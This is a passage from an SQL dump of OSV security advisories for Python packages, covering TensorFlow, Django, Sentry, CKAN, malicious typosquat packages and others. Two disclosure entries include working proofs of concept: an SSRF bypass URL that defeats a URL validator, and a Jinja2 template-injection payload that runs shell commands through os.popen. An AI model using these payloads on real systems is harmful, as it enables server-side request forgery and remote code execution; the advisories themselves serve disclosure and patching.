[AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H](https://nam11.safelinks.protection.outlook.com/?url=https%3A%2F%2Fnvd.nist.gov%2Fvuln-metrics%2Fcvss%2Fv3-calculator%3Fvector%3DAV%3AN%2FAC%3AL%2FPR%3AN%2FUI%3AN%2FS%3AU%2FC%3AH%2FI%3AH%2FA%3AH&data=05%7C01%7Cchesterc%40nvidia.com%7Ce9600bde16854b0b380008da4fc544f7%7C43083d15727340c1b7db39efd9ccc17a%7C0%7C0%7C637910005925574215%7CUnknown%7CTWFpbGZsb3d8eyJWIjoiMC4wLjAwMDAiLCJQIjoiV2luMzIiLCJBTiI6Ik1haWwiLCJXVCI6Mn0%3D%7C3000%7C%7C%7C&sdata=5kBrXEmAbqp8R31JCH%2FG95MUly72UPVihnBwiRFmvBY%3D&reserved=0)


### Patches

The patch will be included in nvflare==2.1.2


### Workarounds
Change yaml.load() to yaml.safe_load()

### Additional information
Issue Found by: Oliver Sellwood (@Nintorac)

', '["0.1.3", "0.9.0", "1.0.0", "1.0.1", "1.0.2", "1.1.0", "1.1.1", "2.0.0", "2.0.1", "2.0.10", "2.0.11", "2.0.12", "2.0.13", "2.0.14", "2.0.15", "2.0.16", "2.0.18", "2.0.19", "2.0.2", "2.0.3", "2.0.4", "2.0.5", "2.0.6", "2.0.7", "2.0.8", "2.0.9", "2.1.0", "2.1.1"]'::jsonb, '0.0', '2022-06-22 21:22:46+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('PYSEC-2021-667', 'OSV', 'tensorflow-gpu', 'pypi', '', 'TensorFlow is an end-to-end open source platform for machine learning. An attacker can trigger a dereference of a null pointer in `tf.raw_ops.StringNGrams`. This is because the implementation(https://github.com/tensorflow/tensorflow/blob/1cdd4da14282210cc759e468d9781741ac7d01bf/tensorflow/core/kernels/string_ngrams_op.cc#L67-L74) does not fully validate the `data_splits` argument. This would result in `ngrams_data`(https://github.com/tensorflow/tensorflow/blob/1cdd4da14282210cc759e468d9781741ac7d01bf/tensorflow/core/kernels/string_ngrams_op.cc#L106-L110) to be a null pointer when the output would be computed to have 0 or negative size. Later writes to the output tensor would then cause a null pointer dereference. The fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.', '["0.12.0", "0.12.1", "1.0.0", "1.0.1", "1.1.0", "1.10.0", "1.10.1", "1.11.0", "1.12.0", "1.12.2", "1.12.3", "1.13.1", "1.13.2", "1.14.0", "1.15.0", "1.15.2", "1.15.3", "1.15.4", "1.15.5", "1.2.0", "1.2.1", "1.3.0", "1.4.0", "1.4.1", "1.5.0", "1.5.1", "1.6.0", "1.7.0", "1.7.1", "1.8.0", "1.9.0", "2.0.0", "2.0.1", "2.0.2", "2.0.3", "2.0.4", "2.1.0", "2.1.1", "2.1.2", "2.1.3", "2.2.0", "2.2.1", "2.2.2", "2.3.0", "2.3.1", "2.3.2", "2.4.0", "2.4.1"]'::jsonb, '0.0', '2021-05-14 20:15:00+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('PYSEC-2021-439', 'OSV', 'django', 'pypi', '', 'In Django 2.2 before 2.2.25, 3.1 before 3.1.14, and 3.2 before 3.2.10, HTTP requests for URLs with trailing newlines could bypass upstream access control based on URL paths.', '["2.2", "2.2.1", "2.2.10", "2.2.11", "2.2.12", "2.2.13", "2.2.14", "2.2.15", "2.2.16", "2.2.17", "2.2.18", "2.2.19", "2.2.2", "2.2.20", "2.2.21", "2.2.22", "2.2.23", "2.2.24", "2.2.3", "2.2.4", "2.2.5", "2.2.6", "2.2.7", "2.2.8", "2.2.9", "3.1", "3.1.1", "3.1.10", "3.1.11", "3.1.12", "3.1.13", "3.1.2", "3.1.3", "3.1.4", "3.1.5", "3.1.6", "3.1.7", "3.1.8", "3.1.9", "3.2", "3.2.1", "3.2.2", "3.2.3", "3.2.4", "3.2.5", "3.2.6", "3.2.7", "3.2.8", "3.2.9"]'::jsonb, '0.0', '2021-12-08 00:15:00+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('MAL-2026-2114', 'OSV', 'indpack', 'pypi', 'Malicious code in indpack (PyPI)', '
---
_-= Per source details. Do not edit below this line.=-_

## Source: kam193 (85f1ca1d5abdcf2139039fc5e8a08068a8c2cacca8a31fed38fbde74f7b8c04d)
These packages are used as build dependencies of malicious packages in newer waves of the campaign 2026-02-urllib-slim. They are used to split the malicious action between dependencies and are not malicious alone, but are used together to: exfiltrate information through DNS, collect information about the processes and covering tracks by installing packages from local private repositories.

Package nspack additionally notifies upon importing a domain known for malicious activity with the package and hostname.


---

Category: MALICIOUS - The campaign has clearly malicious intent, like infostealers.


Campaign: 2026-03-geekennedy


Reasons (based on the campaign):


 - The package contains code to exfiltrate basic data from the system, like IP or username. It has a limited risk.


 - The malicious code is intentionally included in a dependency of the package
', '["0.1.0"]'::jsonb, '0.0', '2026-03-20 15:31:24+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('PYSEC-2023-182', 'OSV', 'opencv-contrib-python-headless', 'pypi', '', 'opencv-contrib-python-headless versions before v4.8.1.78 bundled libwebp binaries in wheels that are vulnerable to CVE-2023-4863. opencv-contrib-python-headless v4.8.1.78 upgrades the bundled libwebp binary to v1.3.2.', '["3.4.0.14", "3.4.1.15", "3.4.10.35", "3.4.10.37", "3.4.11.39", "3.4.11.41", "3.4.11.43", "3.4.11.45", "3.4.13.47", "3.4.14.51", "3.4.14.53", "3.4.15.55", "3.4.16.57", "3.4.16.59", "3.4.17.61", "3.4.17.63", "3.4.18.65", "3.4.2.16", "3.4.2.17", "3.4.3.18", "3.4.4.19", "3.4.5.20", "3.4.6.27", "3.4.7.28", "3.4.8.29", "3.4.9.31", "3.4.9.33", "4.0.0.21", "4.0.1.23", "4.0.1.24", "4.1.0.25", "4.1.1.26", "4.1.2.30", "4.2.0.32", "4.2.0.34", "4.3.0.36", "4.3.0.38", "4.4.0.40", "4.4.0.42", "4.4.0.44", "4.4.0.46", "4.5.1.48", "4.5.2.52", "4.5.2.54", "4.5.3.56", "4.5.4.58", "4.5.4.60", "4.5.5.62", "4.5.5.64", "4.6.0.66", "4.7.0.68", "4.7.0.72", "4.8.0.74", "4.8.0.76"]'::jsonb, '0.0', '2023-09-29 21:31:43.017134+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('GHSA-fm88-hc3v-3www', 'OSV', 'sentry', 'pypi', 'Sentry vulnerable to stored Cross-Site Scripting (XSS)', '### Impact
An unsanitized payload sent by an Integration platform integration allows the storage of arbitrary HTML tags on the Sentry side. This payload could subsequently be rendered on the Issues page, creating a Stored Cross-Site Scripting (XSS) vulnerability. This vulnerability might lead to the execution of arbitrary scripts in the context of a user’s browser.

Self-hosted Sentry users may be impacted if untrustworthy Integration platform integrations send external issues to their Sentry instance.

### Patches
The patch has been released in [Sentry 24.7.1](https://github.com/getsentry/self-hosted/releases/tag/24.7.1)

### Workarounds
For Sentry SaaS customers, no action is needed. This has been patched on July 22, and even prior to the fix, the exploitation was not possible due to the strict Content Security Policy deployed on sentry.io site.

For self-hosted users, we strongly recommend upgrading Sentry to the latest version. If it is not possible, you could [enable CSP on your self-hosted installation](https://develop.sentry.dev/self-hosted/csp/) with `CSP_REPORT_ONLY = False` (enforcing mode). This will mitigate the risk of XSS.

### References
* Sentry Docs: [Integration platform / Create an External Issue](https://docs.sentry.io/api/integration/create-an-external-issue/)
* Sentry Docs: [Self-hosted CSP](https://develop.sentry.dev/self-hosted/csp/)
* The fix: https://github.com/getsentry/sentry/pull/74648
* PortSwigger: [Stored XSS](https://portswigger.net/web-security/cross-site-scripting/stored)', '["10.0.0", "10.0.1", "20.10.1", "20.11.0", "20.11.1", "20.12.0", "20.12.1", "20.6.0", "20.7.0", "20.7.1", "20.7.2", "20.8.0", "21.1.0", "21.10.0", "21.11.0", "21.12.0", "21.2.0", "21.3.0", "21.3.1", "21.4.0", "21.4.1", "21.5.0", "21.5.1", "21.6.0", "21.6.1", "21.6.2", "21.6.3", "21.7.0", "21.8.0", "21.9.0", "22.1.0", "22.10.0", "22.11.0", "22.12.0", "22.2.0", "22.3.0", "22.4.0", "22.5.0", "22.6.0", "22.7.0", "22.8.0", "22.9.0", "23.1.0", "23.1.1", "23.2.0", "23.3.0", "23.3.1", "23.4.0", "23.5.0", "23.5.1", "23.5.2", "23.6.0", "23.6.1", "23.6.2", "23.7.0", "23.7.1"]'::jsonb, '0.0', '2024-07-23 20:46:39+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('GHSA-q5qw-4364-5hhm', 'OSV', 'django', 'pypi', 'Django Vulnerable to HTTP Response Splitting Attack', 'Django before 1.4.21, 1.5.x through 1.6.x, 1.7.x before 1.7.9, and 1.8.x before 1.8.3 uses an incorrect regular expression, which allows remote attackers to inject arbitrary headers and conduct HTTP response splitting attacks via a newline character in an (1) email message to the EmailValidator, a (2) URL to the URLValidator, or unspecified vectors to the (3) validate_ipv4_address or (4) validate_slug validator.', '["1.8", "1.8.1", "1.8.2", "1.8a1", "1.8b1", "1.8b2", "1.8c1"]'::jsonb, '0.0', '2022-05-17 00:48:30+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('MAL-2024-5907', 'OSV', 'requestst', 'pypi', 'Malicious code in requestst (PyPI)', '
---
_-= Per source details. Do not edit below this line.=-_
', '["2.28.2"]'::jsonb, '0.0', '2024-06-25 13:41:46+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('GHSA-g23j-2vwm-5c25', 'OSV', 'local-deep-research', 'pypi', 'local-deep-research has an SSRF bypass in `safe_get`', E'### Summary
The URL checking logic in local-deep-research has a logical flaw that could be bypassed by attackers, leading to SSRF attacks.

### Details
The current project uses `validate_url` to validate the input URL. The main logic is to perform security checks on the host portion of the URL extracted by urlparse to prevent SSRF attacks.

<img width="1173" height="1107" alt="QQ20260430-212334-30-1" src="https://github.com/user-attachments/assets/52b356aa-9ad3-4b1d-a472-39a2ada3ea23" />

However, there are indeed differences in parsing between urlparse and the library that actually sends the request. For example, in `safe_get`, `validate_url` is first used to perform an SSRF check, and then `requests.get` is used to send the actual request.

<img width="1164" height="1089" alt="QQ20260430-212431-30-2" src="https://github.com/user-attachments/assets/f3decb16-4daa-49e0-861c-273a913487a0" />

The core issue: urlparse() and requests disagree on which host a URL like `http://127.0.0.1:6666\\@1.1.1.1` points to:

- urlparse() treats \\ as a regular character and @ as the userinfo-host delimiter, so it extracts hostname as `1.1.1.1` (public)
- requests treats \\ as a path character, connecting to `127.0.0.1` (internal)

Below is a test code I wrote following the code.
```
#!/usr/bin/env python3
"""Standalone demo: import project via absolute path and call safe_get."""

from __future__ import annotations

import importlib.util
import enum
import sys
import types
from pathlib import Path

# Hardcoded absolute path to the project''s "src" directory.
SRC_ROOT = Path(
    r"d:\\BaiduNetdiskDownload\\local-deep-research-main\\local-deep-research-main\\src"
)

# Python 3.10 compatibility:
# project constants import StrEnum (available in Python 3.11+).
if not hasattr(enum, "StrEnum"):
    class _CompatStrEnum(str, enum.Enum):
        pass

    enum.StrEnum = _CompatStrEnum  # type: ignore[attr-defined]


def _load_safe_get():
    """Load safe_get directly from file, bypassing package __init__ imports."""
    ldr_pkg_name = "local_deep_research"
    security_pkg_name = "local_deep_research.security"

    # Build lightweight package modules so relative imports in safe_requests.py
    # resolve without executing package __init__.py files.
    if ldr_pkg_name not in sys.modules:
        ldr_pkg = types.ModuleType(ldr_pkg_name)
        ldr_pkg.__path__ = [str(SRC_ROOT / "local_deep_research")]  # type: ignore[attr-defined]
        sys.modules[ldr_pkg_name] = ldr_pkg

    if security_pkg_name not in sys.modules:
        security_pkg = types.ModuleType(security_pkg_name)
        security_pkg.__path__ = [str(SRC_ROOT / "local_deep_research" / "security")]  # type: ignore[attr-defined]
        sys.modules[security_pkg_name] = security_pkg

    module_name = "local_deep_research.security.safe_requests"
    module_path = SRC_ROOT / "local_deep_research" / "security" / "safe_requests.py"

    spec = importlib.util.spec_from_file_location(module_name, module_path)
    if spec is None or spec.loader is None:
        raise ImportError(f"Cannot load module from {module_path}")

    module = importlib.util.module_from_spec(spec)
    sys.modules[module_name] = module
    spec.loader.exec_module(module)
    return module.safe_get


safe_get = _load_safe_get()


def main() -> None:
    # Hardcoded URL for demonstration.
    url = "http://127.0.0.1:6666"
    # url = "http://127.0.0.1:6666\\@1.1.1.1"

    safe_get(url, timeout=15)


if __name__ == "__main__":
    main()
```
When an attacker uses `http://127.0.0.1:6666/`, the existing detection logic can detect that this is an internal network address and block it.

<img width="1694" height="503" alt="QQ20260430-212723-30-3" src="https://github.com/user-attachments/assets/366f684d-9191-4acb-b6a2-b2c3c54f0223" />

However, when an attacker uses `http://127.0.0.1:6666\\@1.1.1.1`, the detection logic resolves the host to `1.1.1.1`, which is a public IP address, thus passing the verification. But in the actual request process, this URL is forwarded by requests.get to `http://127.0.0.1:6666`, bypassing the detection and achieving an SSRF attack.

<img width="2424" height="477" alt="QQ20260430-212833-30-4" src="https://github.com/user-attachments/assets/bd175e34-d833-44c5-981b-59cfad3406c3" />

### PoC
```
http://127.0.0.1:6666\\@1.1.1.1
```

### Impact
SSRF



---

## Maintainer note (2026-05-15)

Thanks @Fushuling and @RacerZ-fighting for the detailed report. The remediation
spans four PRs, all merged to `main` and shipped in **v1.6.10**:

**#3873** (merged 2026-05-08) — the load-bearing fix for the parser-differential
bypass:
- New `RFC_FORBIDDEN_URL_CHARS_RE` in `security/ssrf_validator.py` rejects
  URLs containing backslash, ASCII control bytes, or whitespace — RFC 3986
  forbids these and their presence signals a parser-differential attempt.
- Host extraction switched from `urllib.parse.urlparse(url).hostname` to
  `urllib3.util.parse_url(url).host`. `urllib3` is the parser `requests`
  uses internally, so the validator and the HTTP client now agree on the
  destination by construction — closing the `\\@` divergence that drove the
  PoC.
- Same two-layer defence applied to `NotificationURLValidator.validate_service_url`.
- 53 new tests across `test_ssrf_validator.py`, `test_notification_validator.py`,
  `test_safe_requests.py`, and `test_ssrf_redirect_bypass.py`, including the
  advisory PoC `http://127.0.0.1:6666\\@1.1.1.1` and the post-prepare canonical
  form `http://127.0.0.1:6666/%5C@1.1.1.1`.

**#3882** (merged 2026-05-08) — hardens the metadata-IP block and redacts
userinfo from log output so rejected URLs don''t leak credentials to logs.

**#3889** (merged 2026-05-09) — locks in real-world URL fixtures and behavior
invariants from #3873/#3882 as regression tests.

**#3932** (merged 2026-05-10) — blocks IPv6 transition prefixes (`2002::/16`
6to4, `64:ff9b::/96` NAT64, `2001::/32` Teredo, `100::/64` discard) so private
IPv4 destinations cannot be reached via an IPv6-wrapped form. NAT64 has an
operator opt-in (`LDR_SECURITY_ALLOW_NAT64=true`) for IPv6-only deployments,
but cloud metadata IPs remain blocked regardless.

### Affected versions

- **The specific parser-differential bypass** described above exists from
  **v1.3.0** (when `validate_url` was first introduced) through **v1.6.9**.
  The validator used `urlparse(url).hostname` for that entire span.
- **Versions before v1.3.0** had no SSRF validator at all — requests went
  directly to `requests.get()` without any host check. Those versions are
  vulnerable to SSRF via this URL and any other internal address; the
  parser-differential trick is unnecessary.

In both cases the remediation is the same: **upgrade to v1.6.10 or later.**', '["0.1.0", "0.1.1", "0.1.12", "0.1.13", "0.1.14", "0.1.15", "0.1.16", "0.1.17", "0.1.18", "0.1.19", "0.1.20", "0.1.21", "0.1.22", "0.1.23", "0.1.24", "0.1.25", "0.1.26", "0.2.0", "0.2.2", "0.2.3", "0.3.0", "0.3.1", "0.3.10", "0.3.11", "0.3.12", "0.3.2", "0.3.3", "0.3.5", "0.3.6", "0.3.8", "0.3.9", "0.4.0", "0.4.1", "0.4.2", "0.4.3", "0.4.4", "0.5.0", "0.5.2", "0.5.3", "0.5.4", "0.5.5", "0.5.6", "0.5.7", "0.5.9", "0.6.0", "0.6.1", "0.6.4", "0.6.5", "0.6.7", "1.0.0", "1.0.1", "1.1.1", "1.1.10", "1.1.11", "1.1.6", "1.1.7", "1.1.8", "1.1.9", "1.2.0", "1.2.1", "1.2.10", "1.2.11", "1.2.12", "1.2.13", "1.2.14", "1.2.15", "1.2.16", "1.2.17", "1.2.2", "1.2.24", "1.2.25", "1.2.26", "1.2.27", "1.2.28", "1.2.3", "1.2.4", "1.2.5", "1.2.6", "1.2.7", "1.2.8", "1.2.9", "1.3.0", "1.3.1", "1.3.10", "1.3.11", "1.3.12", "1.3.13", "1.3.14", "1.3.15", "1.3.16", "1.3.17", "1.3.18", "1.3.19", "1.3.20", "1.3.21", "1.3.22", "1.3.24", "1.3.25", "1.3.26", "1.3.28", "1.3.29", "1.3.30", "1.3.40", "1.3.41", "1.3.42", "1.3.43", "1.3.44", "1.3.45", "1.3.46", "1.3.47", "1.3.48", "1.3.49", "1.3.50", "1.3.51", "1.3.52", "1.3.53", "1.3.54", "1.3.55", "1.3.56", "1.3.57", "1.3.58", "1.3.59", "1.3.6", "1.3.60", "1.3.7", "1.3.8", "1.3.9", "1.4.0", "1.5.0", "1.5.3", "1.5.5", "1.5.6", "1.6.0", "1.6.1", "1.6.2", "1.6.3", "1.6.4", "1.6.5", "1.6.6", "1.6.7", "1.6.8", "1.6.9"]'::jsonb, '0.0', '2026-05-28 19:18:34+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('MAL-2024-6186', 'OSV', 'urllib33', 'pypi', 'Malicious code in urllib33 (PyPI)', '
---
_-= Per source details. Do not edit below this line.=-_
', '["1.27.15"]'::jsonb, '0.0', '2024-06-25 13:43:58+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('GHSA-gphh-9q3h-jgpp', 'OSV', 'banks', 'pypi', 'banks has Critical Remote Code Execution (RCE) via Jinja2 SSTI', '## Summary

`banks <= 2.4.1` uses `jinja2.Environment()` (unsandboxed) to render prompt templates. Applications that pass user-supplied strings as the template argument to `Prompt()` are vulnerable to Server-Side Template Injection (SSTI), which can lead to Remote Code Execution (RCE) on the host system.

This is a vulnerability in how `banks` initializes its Jinja2 environment — not in Jinja2 itself.

## Vulnerable Code

`src/banks/env.py` — the global Jinja2 environment is created without sandboxing:

```python
env = Environment(
    autoescape=select_autoescape(enabled_extensions=("html", "xml"), default_for_string=False),
    ...
)
```

## Attack Scenario

An application that stores prompt templates in a database, accepts them via an API, or loads them from a user-supplied config file and passes them to `Prompt()` is vulnerable. For example:

```python
# User-controlled input reaches Prompt()
user_input = "{{ self.__init__.__globals__.__builtins__.__import__(''os'').popen(''id'').read() }}"
p = Prompt(user_input)
p.text()  # Executes arbitrary command on the host
```

## Proof of Concept

**Setup:**
```bash
pip install banks==2.4.1
```

**PoC script:**
```python
from banks import Prompt

payload = "{{ self.__init__.__globals__.__builtins__.__import__(''os'').popen(''id'').read() }}"
p = Prompt(payload)
result = p.text()
print(f"[+] Output: {result}")
```

**Confirmed output:**
```
[+] Output: uid=1000(ak) gid=1000(ak) groups=1000(ak),27(sudo),...

text

**File-write proof:**
```python
from banks import Prompt

p = Prompt("{{ self.__init__.__globals__.__builtins__.__import__(''os'').popen(''echo POC > /tmp/rce_banks_exec'').read() }}")
p.text()
```
```bash
ls -l /tmp/rce_banks_exec
# -rw-rw-r-- 1 ak ak 4 Apr 27 15:36 /tmp/rce_banks_exec
```

## Impact

Applications that allow end-users to supply or customize prompt templates are at risk of full Remote Code Execution, including arbitrary command execution, data exfiltration, and server compromise.

## Fix

Fixed in `banks 2.4.2` (PR #74) by switching to `jinja2.sandbox.SandboxedEnvironment`, which blocks the dunder attribute traversal chain this exploit relies on.

Developers on `banks <= 2.4.1` should upgrade to `2.4.2` and avoid passing untrusted user input as the template argument to `Prompt()`.

## Resources
- Fix: https://github.com/masci/banks/pull/74
- CVE-2024-41950 (Haystack — identical root cause, CVSS 7.5)
- CVE-2025-25362 (spacy-llm — identical root cause)
- CWE-1336: Improper Neutralization of Special Elements in a Template Engine', '["0.0.1", "0.0.2", "0.0.3", "0.1.0", "0.1.1", "0.2.0", "0.3.0", "0.3.1", "0.4.1", "0.5.0", "0.6.0", "1.0.0", "1.1.0", "1.2.0", "1.2.1", "1.3.0", "1.4.0", "1.5.0", "1.6.0", "1.6.1", "1.7.0", "1.7.1", "1.8.0", "2.0.0", "2.1.0", "2.1.1", "2.1.2", "2.1.3", "2.2.0", "2.3.0", "2.4.0", "2.4.1"]'::jsonb, '0.0', '2026-05-08 20:36:22+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('GHSA-r3jc-vhf4-6v32', 'OSV', 'ckan', 'pypi', 'CKAN has Cross-site Scripting vector in the Datatables view plugin', 'The [Datatables view plugin](https://docs.ckan.org/en/2.10/maintaining/data-viewer.html#datatables-view) did not properly escape record data coming from the DataStore, leading to a potential XSS vector.


### Impact
Sites running CKAN >= 2.7.0 with the `datatables_view` plugin activated. This is a plugin included in CKAN core, that not activated by default but it is widely used to preview tabular data.

### Patches
This vulnerability has been fixed in CKAN 2.10.5 and 2.11.0

### Workarounds
Prevent importing of tabular files to the DataStore via DataPusher, XLoader,etc, at least those published from untrusted sources.
', '["2.10.0", "2.10.1", "2.10.3", "2.10.4", "2.7.0", "2.7.1", "2.7.10", "2.7.11", "2.7.12", "2.7.2", "2.7.3", "2.7.4", "2.7.5", "2.7.6", "2.7.7", "2.7.8", "2.7.9", "2.8.0", "2.8.1", "2.8.10", "2.8.11", "2.8.12", "2.8.2", "2.8.3", "2.8.4", "2.8.5", "2.8.6", "2.8.7", "2.8.8", "2.8.9", "2.9.0", "2.9.1", "2.9.10", "2.9.11", "2.9.2", "2.9.3", "2.9.4", "2.9.5", "2.9.6", "2.9.7", "2.9.8", "2.9.9"]'::jsonb, '0.0', '2024-08-21 18:26:29+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('PYSEC-2021-277', 'OSV', 'tensorflow', 'pypi', '', 'TensorFlow is an end-to-end open source platform for machine learning. In affected versions an attacker can trigger a read from outside of bounds of heap allocated data by sending invalid arguments to `tf.raw_ops.ResourceScatterUpdate`. The [implementation](https://github.com/tensorflow/tensorflow/blob/f24faa153ad31a4b51578f8181d3aaab77a1ddeb/tensorflow/core/kernels/resource_variable_ops.cc#L919-L923) has an incomplete validation of the relationship between the shapes of `indices` and `updates`: instead of checking that the shape of `indices` is a prefix of the shape of `updates` (so that broadcasting can happen), code only checks that the number of elements in these two tensors are in a divisibility relationship. We have patched the issue in GitHub commit 01cff3f986259d661103412a20745928c727326f. The fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.', '["2.3.0", "2.3.1", "2.3.2", "2.3.3", "2.4.0", "2.4.1", "2.4.2"]'::jsonb, '0.0', '2021-08-12 21:15:00+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('MAL-2024-10407', 'OSV', 'laghtseq', 'pypi', 'Malicious code in laghtseq (PyPI)', '
---
_-= Per source details. Do not edit below this line.=-_

## Source: kam193 (20f5a547a9a50422f27bf42eff38ceaa91f0a3d3949c4c3d1934769172fb028c)
A campaign of probably pentest packages flooding PYPI. Installing the package or importing the module triggers reporting basic info like hostname, path and the username to the package author. There is no other purpose of the package.


---

Category: PROBABLY_PENTEST - Packages looking like typical pentest packages, but also anything that looks like testing, exploring pre-prepared kits, research & co, with clearly low-harm possibilities.


Campaign: 2024-11-byted-dast


Reasons (based on the campaign):


 - The package contains code to exfiltrate basic data from the system, like IP or username. It has a limited risk.


 - typosquatting


 - dependency-confusion

## Source: ossf-package-analysis (2a3358769bb0856182769232dc96faa8dcbef710544e25a20418ab86774c69cc)
The OpenSSF Package Analysis project identified ''laghtseq'' @ 99.7 (pypi) as malicious.

It is considered malicious because:

- The package communicates with a domain associated with malicious activity.
', '["99.7"]'::jsonb, '0.0', '2024-11-06 07:55:38+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('MAL-2024-11601', 'OSV', 'giantmidi-piano', 'pypi', 'Malicious code in giantmidi-piano (PyPI)', '
---
_-= Per source details. Do not edit below this line.=-_

## Source: kam193 (84fa69b27b20b3760633e27545f0bf5895b02cf0566fb6b75465a581802f4975)
A campaign of probably pentest packages flooding PYPI. Installing the package or importing the module triggers reporting basic info like hostname, path and the username to the package author. There is no other purpose of the package.


---

Category: PROBABLY_PENTEST - Packages looking like typical pentest packages, but also anything that looks like testing, exploring pre-prepared kits, research & co, with clearly low-harm possibilities.


Campaign: 2024-11-byted-dast


Reasons (based on the campaign):


 - The package contains code to exfiltrate basic data from the system, like IP or username. It has a limited risk.


 - typosquatting


 - dependency-confusion
', '["912.6"]'::jsonb, '0.0', '2024-11-06 18:46:10+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('PYSEC-2020-230', 'OSV', 'django-user-sessions', 'pypi', '', 'In Django User Sessions (django-user-sessions) before 1.7.1, the views provided allow users to terminate specific sessions. The session key is used to identify sessions, and thus included in the rendered HTML. In itself this is not a problem. However if the website has an XSS vulnerability, the session key could be extracted by the attacker and a session takeover could happen.', '["0.1.0", "0.1.0-beta", "0.1.0-dev", "0.1.1", "0.1.2", "0.1.3", "0.1.4", "1.0.0", "1.0.0-beta1", "1.1.0", "1.1.1", "1.2.0", "1.3.0", "1.3.1", "1.4.0", "1.5.0", "1.5.1", "1.5.2", "1.5.3", "1.6.0", "1.7.0"]'::jsonb, '0.0', '2020-01-24 20:15:00+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('GHSA-4cvm-5776-jx9f', 'OSV', 'ansible', 'pypi', 'Ansible Arbitrary Code Execution', 'User module in ansible before 1.6.6 is vulnerable to command execution. Ansible can get the result of remote command in variable, which may come from untrusted source of input. If the content of variable isn''t properly filtered and when attempting to use the variable, it will trigger a function that passes it through jinja 2 template engine that can result into arbitrary command execution. Under certain circumstances, unprivileged user on system that is being managed via ansible can execute code on the managing host under UID of running ansible process.
', '["1.0", "1.1", "1.2", "1.2.1", "1.2.2", "1.2.3", "1.3.0", "1.3.1", "1.3.2", "1.3.3", "1.3.4", "1.4", "1.4.1", "1.4.2", "1.4.3", "1.4.4", "1.4.5", "1.5", "1.5.1", "1.5.2", "1.5.3", "1.5.4", "1.5.5", "1.6", "1.6.1", "1.6.2", "1.6.3", "1.6.4", "1.6.5"]'::jsonb, '0.0', '2022-05-14 02:03:45+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('MAL-2024-10364', 'OSV', 'babetmf', 'pypi', 'Malicious code in babetmf (PyPI)', '
---
_-= Per source details. Do not edit below this line.=-_

## Source: kam193 (987c4add9b19c89eba1cda6d715fd3c23f6dce61861e1d345ddedccac23e73ee)
A campaign of probably pentest packages flooding PYPI. Installing the package or importing the module triggers reporting basic info like hostname, path and the username to the package author. There is no other purpose of the package.


---

Category: PROBABLY_PENTEST - Packages looking like typical pentest packages, but also anything that looks like testing, exploring pre-prepared kits, research & co, with clearly low-harm possibilities.


Campaign: 2024-11-byted-dast


Reasons (based on the campaign):


 - The package contains code to exfiltrate basic data from the system, like IP or username. It has a limited risk.


 - typosquatting


 - dependency-confusion

## Source: ossf-package-analysis (47f05e95900f93ce8b02c58ce179ae2f02386c2f1d66b28a68a1569aeede7023)
The OpenSSF Package Analysis project identified ''babetmf'' @ 99.7 (pypi) as malicious.

It is considered malicious because:

- The package communicates with a domain associated with malicious activity.
', '["99.7"]'::jsonb, '0.0', '2024-11-05 08:40:49+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('GHSA-28jp-44vh-q42h', 'OSV', 'keras', 'pypi', 'Duplicate Advisory: Keras keras.utils.get_file API is vulnerable to a path traversal attack', '### Duplicate Advisory
This advisory has been withdrawn because it is a duplicate of GHSA-hjqc-jx6g-rwp9. This link is maintained to preserve external references.

### Original Description
